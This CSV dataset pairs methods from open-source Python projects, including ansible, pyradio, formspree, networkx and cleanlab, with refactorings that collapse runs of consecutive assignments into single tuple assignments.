repo_name,file_html,class_name,me_name,me_code,old_code,new_code
ansible-modules-extras,https://github.com/ansible/ansible-modules-extras/tree/master/network/f5/bigip_selfip.py,BigIpSelfIp,update$416,"def update(self):
        changed = False
        svcs = []
        params = dict()
        current = self.read()

        check_mode = self.params['check_mode']
        address = self.params['address']
        allow_service = self.params['allow_service']
        name = self.params['name']
        netmask = self.params['netmask']
        partition = self.params['partition']
        traffic_group = self.params['traffic_group']
        vlan = self.params['vlan']
        route_domain = self.params['route_domain']

        if address is not None and address != current['address']:
            raise F5ModuleError(
                'Self IP addresses cannot be updated'
            )

        if netmask is not None:
            # I ignore the address value here even if they provide it because
            # you are not allowed to change it.
            try:
                address = IPNetwork(current['address'])

                new_addr = ""%s/%s"" % (address.ip, netmask)
                nipnet = IPNetwork(new_addr)
                if route_domain is not None:
                    nipnet = ""%s%s%s"" % (address.ip, route_domain, netmask)

                cur_addr = ""%s/%s"" % (current['address'], current['netmask'])
                cipnet = IPNetwork(cur_addr)
                if route_domain is not None:
                    cipnet = ""%s%s%s"" % (current['address'], current['route_domain'], current['netmask'])

                if nipnet != cipnet:
                    if route_domain is not None:
                        address = ""%s%s%s/%s"" % (address.ip, '%', route_domain, netmask)
                    else:
                        address = ""%s/%s"" % (nipnet.ip, nipnet.prefixlen)
                    params['address'] = address
            except AddrFormatError:
                raise F5ModuleError(
                    'The provided address/netmask value was invalid'
                )

        if traffic_group is not None:
            traffic_group = ""/%s/%s"" % (partition, traffic_group)
            if traffic_group not in self.traffic_groups():
                raise F5ModuleError(
                    'The specified traffic group was not found'
                )

            if 'traffic_group' in current:
                if traffic_group != current['traffic_group']:
                    params['trafficGroup'] = traffic_group
            else:
                params['trafficGroup'] = traffic_group

        if vlan is not None:
            vlans = self.get_vlans()
            vlan = ""/%s/%s"" % (partition, vlan)

            if 'vlan' in current:
                if vlan != current['vlan']:
                    params['vlan'] = vlan
            else:
                params['vlan'] = vlan

            if vlan not in vlans:
                raise F5ModuleError(
                    'The specified VLAN was not found'
                )

        if allow_service is not None:
            svcs = self.verify_services()
            if 'allow_service' in current:
                if svcs != current['allow_service']:
                    params['allowService'] = self.fmt_services(svcs)
            else:
                params['allowService'] = self.fmt_services(svcs)

        if params:
            changed = True
            params['name'] = name
            params['partition'] = partition
            if check_mode:
                return changed
            self.cparams = camel_dict_to_snake_dict(params)
            if svcs:
                self.cparams['allow_service'] = list(svcs)
        else:
            return changed

        r = self.api.tm.net.selfips.selfip.load(
            name=name,
            partition=partition
        )
        r.update(**params)
        r.refresh()

        return True","changed = True
params['name'] = name
params['partition'] = partition","changed , params['name'] , params['partition']  = True, name, partition"
pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['general_title'][1] = ''
self._config_options['player'][1] = 'mpv,mplayer,vlc'
self._config_options['open_last_playlist'][1] = 'False'
self._config_options['default_playlist'][1] = 'stations'
self._config_options['default_station'][1] = 'False'
self._config_options['default_encoding'][1] = 'utf-8'
self._config_options['enable_mouse'][1] = 'False'
self._config_options['connection_timeout'][1] = '10'
self._config_options['theme_title'][1] = ''","self._config_options['general_title'][1] , self._config_options['player'][1] , self._config_options['open_last_playlist'][1] , self._config_options['default_playlist'][1] , self._config_options['default_station'][1] , self._config_options['default_encoding'][1] , self._config_options['enable_mouse'][1] , self._config_options['connection_timeout'][1] , self._config_options['theme_title'][1]  = '', 'mpv,mplayer,vlc', 'False', 'stations', 'False', 'utf-8', 'False', '10', ''"
pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['use_transparency'][1] = False
self._config_options['force_http'][1] = False","self._config_options['use_transparency'][1] , self._config_options['force_http'][1]  = False, False"
pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['playlist_manngement_title'][1] = ''
self._config_options['confirm_station_deletion'][1] = True
self._config_options['confirm_playlist_reload'][1] = True
self._config_options['auto_save_playlist'][1] = False
self._config_options['requested_player'][1] = ''","self._config_options['playlist_manngement_title'][1] , self._config_options['confirm_station_deletion'][1] , self._config_options['confirm_playlist_reload'][1] , self._config_options['auto_save_playlist'][1] , self._config_options['requested_player'][1]  = '', True, True, False, ''"
eliot,https://github.com/itamarst/eliot/tree/master/eliot/tests/test_twisted.py,DeferredContextTests,test_addActionFinishSuccess$248,"def test_addActionFinishSuccess(self):
        """"""
        When the L{Deferred} referred to by L{DeferredContext.addActionFinish}
        fires successfully, a finish message is logged.
        """"""
        d = Deferred()
        logger = MemoryLogger()
        action = Action(logger, ""uuid"", TaskLevel(level=[1]), ""sys:me"")
        with action.context():
            DeferredContext(d).addActionFinish()
        d.callback(""result"")
        assertContainsFields(
            self,
            logger.messages[0],
            {
                ""task_uuid"": ""uuid"",
                ""task_level"": [1, 1],
                ""action_type"": ""sys:me"",
                ""action_status"": ""succeeded"",
            },
        )","d = Deferred()
logger = MemoryLogger()","d , logger  = Deferred(), MemoryLogger()"
formspree,https://github.com/formspree/formspree/tree/master/formspree/forms/models.py,Form,submissions_with_fields$157,"def submissions_with_fields(self):
        '''
        Fetch all submissions, extract all fields names from every submission
        into a single fields list, excluding the KEYS_NOT_STORED values, because
        they are worthless.
        Add the special 'date' field to every submission entry, based on
        .submitted_at, and use this as the first field on the fields array.
        '''

        fields = set()
        submissions = []
        for s in self.submissions:
            data = s.data.copy()
            fields.update(data.keys())
            data[""date""] = s.submitted_at.isoformat()
            data[""id""] = s.id
            for k in KEYS_NOT_STORED:
                data.pop(k, None)
            submissions.append(data)

        fields = ['date'] + sorted(fields - KEYS_NOT_STORED)
        return submissions, fields","fields = set()
submissions = []","fields , submissions  = set(), []"
formspree,https://github.com/formspree/formspree/tree/master/formspree/forms/models.py,Form,submissions_with_fields$157,"def submissions_with_fields(self):
        '''
        Fetch all submissions, extract all fields names from every submission
        into a single fields list, excluding the KEYS_NOT_STORED values, because
        they are worthless.
        Add the special 'date' field to every submission entry, based on
        .submitted_at, and use this as the first field on the fields array.
        '''

        fields = set()
        submissions = []
        for s in self.submissions:
            data = s.data.copy()
            fields.update(data.keys())
            data[""date""] = s.submitted_at.isoformat()
            data[""id""] = s.id
            for k in KEYS_NOT_STORED:
                data.pop(k, None)
            submissions.append(data)

        fields = ['date'] + sorted(fields - KEYS_NOT_STORED)
        return submissions, fields","data['date'] = s.submitted_at.isoformat()
data['id'] = s.id","data['date'] , data['id']  = s.submitted_at.isoformat(), s.id"
django-user-accounts,https://github.com/pinax/django-user-accounts/tree/master/account/tests/test_auth.py,UsernameAuthenticationBackendTestCase,test_successful_auth_django_2_1$32,"def test_successful_auth_django_2_1(self):
        created_user = self.create_user(""user1"", ""user1@example.com"", ""password"")
        request = None
        authed_user = authenticate(request, username=""user1"", password=""password"")
        self.assertTrue(authed_user is not None)
        self.assertEqual(created_user.pk, authed_user.pk)","created_user = self.create_user('user1', 'user1@example.com', 'password')
request = None","created_user , request  = self.create_user('user1', 'user1@example.com', 'password'), None"
luna,https://github.com/greatscottgadgets/luna/tree/master/luna/gateware/usb/usb3/application/request.py,SuperSpeedRequestHandlerMultiplexer,_multiplex_signals$288,"def _multiplex_signals(self, m, *, when, multiplex, sub_bus=None):
        """""" Helper that creates a simple priority-encoder multiplexer.

        Parmeters:
            when      -- The name of the interface signal that indicates that the `multiplex` signals
                         should be selected for output. If this signals should be multiplex, it
                         should be included in `multiplex`.
            multiplex -- The names of the interface signals to be multiplexed.
        """"""

        def get_signal(interface, name):
            """""" Fetches an interface signal by name / sub_bus. """"""

            if sub_bus:
                bus = getattr(interface, sub_bus)
                return getattr(bus, name)
            else:
                return  getattr(interface, name)


        # We're building an if-elif tree; so we should start with an If entry.
        conditional = m.If

        for interface in self._interfaces:
            condition = get_signal(interface, when)

            with conditional(condition):

                # Connect up each of our signals.
                for signal_name in multiplex:

                    # Get the actual signals for our input and output...
                    driving_signal = get_signal(interface,   signal_name)
                    target_signal  = get_signal(self.shared, signal_name)

                    # ... and connect them.
                    m.d.comb += target_signal   .eq(driving_signal)

            # After the first element, all other entries should be created with Elif.
            conditional = m.Elif","driving_signal = get_signal(interface, signal_name)
target_signal = get_signal(self.shared, signal_name)","driving_signal , target_signal  = get_signal(interface, signal_name), get_signal(self.shared, signal_name)"
plaso,https://github.com/log2timeline/plaso/tree/master/plaso/containers/event_sources.py,EventSource,__init__$28,"def __init__(self, file_entry_type=None, path_spec=None):
    """"""Initializes an event source.

    Args:
      file_entry_type (Optional[str]): dfVFS file entry type.
      path_spec (Optional[dfvfs.PathSpec]): path specification.
    """"""
    super(EventSource, self).__init__()
    self.data_type = self.DATA_TYPE
    self.file_entry_type = file_entry_type
    self.path_spec = path_spec","self.data_type = self.DATA_TYPE
self.file_entry_type = file_entry_type
self.path_spec = path_spec","self.data_type , self.file_entry_type , self.path_spec  = self.DATA_TYPE, file_entry_type, path_spec"
pgmpy,https://github.com/pgmpy/pgmpy/tree/master/pgmpy/tests/test_models/test_MarkovModel.py,TestUndirectedGraphTriangulation,test_triangulation_h6_inplace$449,"def test_triangulation_h6_inplace(self):
        self.graph.add_edges_from([(""a"", ""b""), (""b"", ""c""), (""c"", ""d""), (""d"", ""a"")])
        phi1 = DiscreteFactor([""a"", ""b""], [2, 3], np.random.rand(6))
        phi2 = DiscreteFactor([""b"", ""c""], [3, 4], np.random.rand(12))
        phi3 = DiscreteFactor([""c"", ""d""], [4, 5], np.random.rand(20))
        phi4 = DiscreteFactor([""d"", ""a""], [5, 2], np.random.random(10))
        self.graph.add_factors(phi1, phi2, phi3, phi4)
        self.graph.triangulate(heuristic=""H4"", inplace=True)
        self.assertTrue(self.graph.is_triangulated())
        self.assertListEqual(
            hf.recursive_sorted(self.graph.edges()),
            [[""a"", ""b""], [""a"", ""d""], [""b"", ""c""], [""b"", ""d""], [""c"", ""d""]],
        )","phi1 = DiscreteFactor(['a', 'b'], [2, 3], np.random.rand(6))
phi2 = DiscreteFactor(['b', 'c'], [3, 4], np.random.rand(12))
phi3 = DiscreteFactor(['c', 'd'], [4, 5], np.random.rand(20))
phi4 = DiscreteFactor(['d', 'a'], [5, 2], np.random.random(10))","phi1 , phi2 , phi3 , phi4  = DiscreteFactor(['a', 'b'], [2, 3], np.random.rand(6)), DiscreteFactor(['b', 'c'], [3, 4], np.random.rand(12)), DiscreteFactor(['c', 'd'], [4, 5], np.random.rand(20)), DiscreteFactor(['d', 'a'], [5, 2], np.random.random(10))"
freeipa,https://github.com/freeipa/freeipa/tree/master/ipatests/test_integration/test_dns_locations.py,TestDNSLocations,test_change_weight$388,"def test_change_weight(self):
        """"""Change weight of master and test if records changed properly
        """"""

        new_weight = 2000

        self.master.run_command([
            'ipa', 'server-mod', self.master.hostname, '--service-weight',
            str(new_weight)
        ])

        # all servers must be restarted
        tasks.restart_named(self.master, self.replicas[0], self.replicas[1])

        servers_prague_loc = (
            (self.PRIO_LOW, new_weight, DNSName(self.master.hostname)),
            (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)),
            (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname)),
        )
        domain_prague_loc = (
            DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(
                self.master.domain.name).make_absolute())

        servers_paris_loc = (
            (self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)),
            (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)),
            (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname)),
        )
        domain_paris_loc = (
            DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(
                self.master.domain.name).make_absolute())

        self._test_SRV_rec_against_server(
            self.replicas[0].ip, domain_prague_loc, servers_prague_loc
        )
        self._test_URI_rec_against_server(
            self.replicas[0].ip, domain_prague_loc, servers_prague_loc
        )

        for ip in (self.replicas[1].ip, self.master.ip):
            self._test_SRV_rec_against_server(
                ip, domain_paris_loc, servers_paris_loc
            )
            self._test_URI_rec_against_server(
                ip, domain_paris_loc, servers_paris_loc
            )","servers_prague_loc = ((self.PRIO_LOW, new_weight, DNSName(self.master.hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname)))
domain_prague_loc = DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(self.master.domain.name).make_absolute()
servers_paris_loc = ((self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname)))
domain_paris_loc = DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(self.master.domain.name).make_absolute()","servers_prague_loc , domain_prague_loc , servers_paris_loc , domain_paris_loc  = ((self.PRIO_LOW, new_weight, DNSName(self.master.hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname))), DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(self.master.domain.name).make_absolute(), ((self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname))), DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(self.master.domain.name).make_absolute()"
networkx,https://github.com/networkx/networkx/tree/master/networkx/algorithms/centrality/tests/test_katz_centrality.py,TestKatzCentralityNumpy,test_P3_unweighted$234,"def test_P3_unweighted(self):
        """"""Katz centrality: P3""""""
        alpha = 0.1
        G = nx.path_graph(3)
        b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
        b = nx.katz_centrality_numpy(G, alpha, weight=None)
        for n in sorted(G):
            assert b[n] == pytest.approx(b_answer[n], abs=1e-4)","alpha = 0.1
G = nx.path_graph(3)","alpha , G  = 0.1, nx.path_graph(3)"
networkx,https://github.com/networkx/networkx/tree/master/networkx/algorithms/centrality/tests/test_katz_centrality.py,TestKatzCentralityNumpy,test_P3_unweighted$234,"def test_P3_unweighted(self):
        """"""Katz centrality: P3""""""
        alpha = 0.1
        G = nx.path_graph(3)
        b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
        b = nx.katz_centrality_numpy(G, alpha, weight=None)
        for n in sorted(G):
            assert b[n] == pytest.approx(b_answer[n], abs=1e-4)","b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
b = nx.katz_centrality_numpy(G, alpha, weight=None)","b_answer , b  = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}, nx.katz_centrality_numpy(G, alpha, weight=None)"
growlab,https://github.com/alexellis/growlab/tree/master/app/camera.py,camera,get_frame$9,"def get_frame(self):
        stream = io.BytesIO()
        with picamera.PiCamera() as camera:
            camera.start_preview()
            camera.vflip = self.camera_opts[""vertical_flip""]
            camera.hflip = self.camera_opts[""horizontal_flip""]
            camera.meter_mode = self.camera_opts[""meter_mode""]
            camera.exposure_mode = ""auto""
            camera.resolution = (self.camera_opts[""width""], self.camera_opts[""height""])
            # Camera warm-up time
            time.sleep(self.camera_opts[""preview_seconds""])
            camera.capture(stream, format=self.camera_opts[""encoding""], quality=self.camera_opts[""image_quality""])

        return stream","camera.vflip = self.camera_opts['vertical_flip']
camera.hflip = self.camera_opts['horizontal_flip']
camera.meter_mode = self.camera_opts['meter_mode']
camera.exposure_mode = 'auto'
camera.resolution = (self.camera_opts['width'], self.camera_opts['height'])","camera.vflip , camera.hflip , camera.meter_mode , camera.exposure_mode , camera.resolution  = self.camera_opts['vertical_flip'], self.camera_opts['horizontal_flip'], self.camera_opts['meter_mode'], 'auto', (self.camera_opts['width'], self.camera_opts['height'])"
GPflow,https://github.com/GPflow/GPflow/tree/master/gpflow/kernels/changepoints.py,ChangePoints,_sigmoids$167,"def _sigmoids(self, X: tf.Tensor) -> tf.Tensor:
        locations = tf.sort(self.locations)  # ensure locations are ordered
        locations = tf.reshape(locations, (-1,))
        steepness = tf.reshape(self.steepness, (-1,))
        return tf.sigmoid(steepness * (X[..., None] - locations))","locations = tf.reshape(locations, (-1,))
steepness = tf.reshape(self.steepness, (-1,))","locations , steepness  = tf.reshape(locations, (-1,)), tf.reshape(self.steepness, (-1,))"
rllab,https://github.com/rll/rllab/tree/master/rllab/envs/box2d/parser/xml_box2d.py,XmlWorld,to_box2d$58,"def to_box2d(self, extra_data, world=None):
        if world is None:
            world = Box2D.b2World(allow_sleeping=False)
        world.warmStarting = self.warmStarting
        world.continuousPhysics = self.continuousPhysics
        world.subStepping = self.subStepping
        extra_data.velocityIterations = self.velocityIterations
        extra_data.positionIterations = self.positionIterations
        extra_data.timeStep = self.timeStep
        if self.gravity:
            world.gravity = self.gravity
        for body in self.bodies:
            body.to_box2d(world, self, extra_data)
        for joint in self.joints:
            joint.to_box2d(world, self, extra_data)
        for state in self.states:
            state.to_box2d(world, self, extra_data)
        for control in self.controls:
            control.to_box2d(world, self, extra_data)
        return world","world.warmStarting = self.warmStarting
world.continuousPhysics = self.continuousPhysics
world.subStepping = self.subStepping
extra_data.velocityIterations = self.velocityIterations
extra_data.positionIterations = self.positionIterations
extra_data.timeStep = self.timeStep","world.warmStarting , world.continuousPhysics , world.subStepping , extra_data.velocityIterations , extra_data.positionIterations , extra_data.timeStep  = self.warmStarting, self.continuousPhysics, self.subStepping, self.velocityIterations, self.positionIterations, self.timeStep"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","xbin_width = width // xbins
ybin_height = height // ybins
inp = inp.numpy().transpose((1, 2, 0))","xbin_width , ybin_height , inp  = width // xbins, height // ybins, inp.numpy().transpose((1, 2, 0))"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","img_labels = img_labels + [''] * pad_size
img_pred = img_pred + [''] * pad_size
img_fns = img_fns + [''] * pad_size
num_red_boxes = 0","img_labels , img_pred , img_fns , num_red_boxes  = img_labels + [''] * pad_size, img_pred + [''] * pad_size, img_fns + [''] * pad_size, 0"
